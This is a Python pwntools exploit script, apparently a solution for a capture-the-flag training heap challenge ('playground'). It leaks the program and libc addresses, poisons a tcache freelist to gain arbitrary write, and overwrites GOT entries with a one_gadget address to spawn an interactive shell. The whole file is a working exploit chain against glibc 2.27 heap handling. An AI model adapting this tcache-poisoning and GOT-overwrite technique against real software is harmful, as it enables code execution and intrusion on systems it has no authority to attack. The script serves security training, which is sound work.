#! /usr/bin/python3
import pwn
import sys


def malloc(nbytes):
    r.sendline("malloc " + str(nbytes))
    out = r.recv()
    pwn.log.debug(out)
    out = out[out.rfind(b'x')+1:out.rfind(b'\n')]
    #pwn.log.debug(out)
    out = out.decode('ascii')
    #pwn.log.debug(out)
    out = bytes.fromhex(out)
    #pwn.log.debug(out)
    out = (8-len(out))*b'\x00'+out
    #pwn.log.debug(out)
    out = pwn.packing.u64(out, endianness="big")
    pwn.log.debug("out value:"+hex(out))
    return out


def show(address, nbytes):
    r.sendline("show "+str(hex(address))+" "+str(nbytes))
    out = r.recv()
    return out


def write(address, payload):
    r.sendline("write "+str(hex(address))+" "+str(len(payload)))
    r.recv()
    r.send(payload)
    r.recv()

def free(address):
    r.sendline("free " + str(hex(address)))
    r.recv()

#def read(address):


pwn.context.terminal = ['tmux', 'split-window', '-h']
args = sys.argv
if "remote" not in args:
    r = pwn.process("./playground")
    pwn.context.log_level = "DEBUG"
    pwn.context.arch = "amd64"
    if "gdb" in args:
        print("debug")
        gdb = pwn.gdb.attach(r, '''
        b main
        ''')
else:
    r = pwn.remote("bin.training.offdef.it", 4110)

libc = pwn.ELF("./libc-2.27.so")
print(libc.symbols)
onegadgets_addrs = [0x4f2a5, 0x4f302, 0x10a2fc]
main_leak = r.recv()
main_leak = main_leak[main_leak.rfind(b'main')+6:main_leak.rfind(b'\n')]
print("main in hex: ", main_leak.hex())
main_leak = str(main_leak, 'ascii')
print("main in hex: ", main_leak)
main_leak = int(main_leak, 16)
print("main in hex: ", hex(main_leak))
text_start = main_leak-0x1d9
bss_start = text_start+0x3000
max_heap = bss_start+0xa0
address1 = malloc(20)
address2 = malloc(20)
free(address1)
free(address2)
write(address2, pwn.packing.p64(max_heap))
address2 = malloc(20)
max_heap_chunk = malloc(20)  # to make the key 0
malloc_got = max_heap - 0x50
libc_leak = show(malloc_got, 1)
pwn.log.debug(libc_leak)
libc_leak = libc_leak.rsplit()[1]
pwn.log.debug(libc_leak)
libc_leak = str(libc_leak, 'ascii')
libc_leak = int(libc_leak, 16)
libc_base_address = libc_leak - libc.symbols["malloc"]
pwn.log.debug(libc_base_address)
getpid_got = max_heap - 0x78
print("getpid_got value: ", hex(getpid_got))
addr3 = malloc(40)
write(getpid_got, pwn.packing.p64(libc_base_address + onegadgets_addrs[1]))
pwn.log.debug("getpid_got written")
write(malloc_got, pwn.packing.p64(main_leak))
pwn.log.debug("GOING TO RESTART MAIN!!!!")
r.sendline("malloc 30")
r.interactive()


# out = show(address1, 4)
# pwn.log.debug(out)
# 
# print(hex(address1))
